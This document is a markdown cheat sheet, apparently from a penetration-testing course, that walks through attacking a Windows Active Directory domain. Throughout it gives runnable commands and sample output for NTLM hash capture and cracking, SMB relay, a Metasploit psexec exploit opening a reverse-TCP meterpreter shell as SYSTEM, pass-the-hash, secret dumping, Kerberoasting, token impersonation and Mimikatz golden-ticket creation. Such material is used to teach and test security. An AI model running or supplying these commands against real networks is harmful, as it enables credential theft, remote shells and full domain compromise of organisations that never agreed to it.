## Active Directory Attack Guide.

#### Capture `NTLMv2` Hashes with `Responder`
```
> sudo responder -I eth0 - rdwv
```
#### Crack the Hash with `Hashcat`
```
> hashcat -m 5600 hash rockyou.txt
--help:
MODE | 5600 | NetNTLMv2 | Network Protocol
```

#### Edit the Responder Config File for `SMB Relay Attack`
```
> nano /etc/responder/responder.conf

; Servers to start
SQL = On
SMB = Off
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
DCERPC = On
WINRM = On
```

#### Running `Responder`
```
> sudo responder -I eth0 - rdwv
```
#### Starting `NTLMrelayx` part of Impacket Tools
```
> ntlmrelayx.py -tf targets.txt -smb2support -i 
--help:
-i -- intercative
-e -- execute payload (test.exe) (Creating a payload with msfvenom)
-c -- run a command (whoami)

[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from DOMAIN/user@192.168.164.141 controlled, attacking target smb://192.168.164.142
[*] Authenticating against smb://192.168.164.142 as DOMAIN/USER SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[*] SMBD-Thread-4: Connection from DOMAIN/USER@192.168.164.141 controlled, but there are no more targets left!
[-] SMB SessionError: STATUS_NO_SUCH_FILE({File Not Found} The file %hs does not exist.)

```

#### `Netcat` Listener on localhost
```
> nc 127.0.0.1 11000
Type help for list of commands
# shares
ADMIN$
C$
IPC$
Share
```
#### Exploiting the Target with `Metasploit`

```
> msfconsole

use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                192.168.164.141  yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wi
                                                    ki/Using-Metasploit
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBDomain             DOMAIN.local     no        The Windows domain to use for authentication
   SMBPass               pass_123         no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a norma
                                                    l read/write folder share
   SMBUser               user             no        The username to authenticate as


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.164.137  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

msf6 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 192.168.164.137:4444
[*] 192.168.164.141:445 - Connecting to the server...
[*] 192.168.164.141:445 - Authenticating to 192.168.164.141:445|marvel.local as user 'user'...
[*] 192.168.164.141:445 - Selecting PowerShell target
[*] 192.168.164.141:445 - Executing the payload...
[+] 192.168.164.141:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (200262 bytes) to 192.168.164.141
[*] Meterpreter session 1 opened (192.168.164.137:4444 -> 192.168.164.141:58863 ) at 2022-01-12 22:38:10 +0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
#### Enumeration with `PowerView.ps1`
```
> powershell -ep bypass

> . .\PowerView.ps1

> Get-NetDomain

> Get-NetDomainController

> Get-DomainPolicy
	> (Get-DomainPolicy)."system access"
		
> Get-NetUser (select = grep in Linux)
	> Get-NetUser | select description
	> Get-NetUser | select samaccountname
	> Get-NetUser | select cn
		
> Get-UserProperty
	> Get-UserProperty -Properties pwdlastset
		
> Get-NetComputer (select = grep in Linux)
	> Get-NetComputer | select cn
	> Get-NetComputer | select operatingSystem
		
> Get-NetGroup
	> Get-NetGroup -Identity *admin*
		
> Get-NetGroupMember -Identity "Domain Admins"

> Invoke-ShareFinder

> Get-NetGPO | select displayname, whenchange      
```

### Note: ```NTLM``` hash can be passed but not ```NTLMv2```

#### Pass the Hash with `Crackmapexec`

```
> crackmapexec smb 192.168.164.0/24 -u user -d DOMAIN.local -p password

. DumpHashes
> crackmapexec smb 192.168.164.0/24 -u user -d DOMAIN.local -p password --sam

> crackmapexec smb 192.168.164.0/24 -u "Full Name" -H HASH --local-auth

```
#### Enumeration with `lookupsid.py` (searching for users SID)
```
. anonymous login must be enabled.
> lookupsid.py anonymous@192.168.1.1 | tee users.txt
```

#### Dumping Hash with `Secretsdump.py`
```
> secretsdump.py domain/user:password@192.168.164.141
```
#### Getting a Shell with `PsExec.py` (LMHASH:NTHASH)
```
> psexec.py "username":@192.168.164.141 -hashes LMHASH:NTHASH
> psexec.py DOMAIN.local/Administrator:'password'@192.168.164.141 (character-escaping with '')
```
#### Token Impersonation with `Incognito` (Metasploit)
Note: Impersonation works with Logged in Users, Token is valid till the PC is Rebooted.

 * Delegate Token - Login or RDP Sessions
```
meterpreter > load incognito

meterpreter > list_tokens -u

meterpreter > impersonate_token domain\\user

meterpreter > shell

C:\Windows\system32>whoami

meterpreter > rev2self (revert back to user we gained shell as)
```	
#### Dumping Hashes with `GetUserSPNs.py` (`Kerberoasting`)
```
> GetUserSPNs.py DOMAIN.local/user:password -dc-ip (DC-ip-addr) -request

> GetNPUsers.py DOMAIN.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.1
```

#### Cracking `Kerberos` hash with `Hashcat`
```
> hashcat -m 13100 kerberos-hash.txt rockyou.txt
MODE | 13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol
```
#### Post-Exploitation with Mimikatz
```
> . .\mimikatz.exe
  privilege::debug [privilege "20" ok]
  
. Dump the hash and security identifier of the Kerberos Ticket Granting Ticket account
> lsadump::lsa /inject /name:krbtgt 

. Create a Golden Ticket
> kerberos::golden /user: /domain: /sid: /krbtgt: /id:

. Dump NTLM hashes
> lsadump::lsa /patch

. Cracking NTLM hash with John the Ripper and Hashcat
> john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
> hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```
#### Gaining Shell with Evil-Winrm
```
Ports:
5985/tcp (HTTP)
5986/tcp (HTTPS)

> evil-winrm -i 192.168.1.1 -u username -p "password"
> evil-winrm -i 192.168.1.1 -u username -H "hash"
```


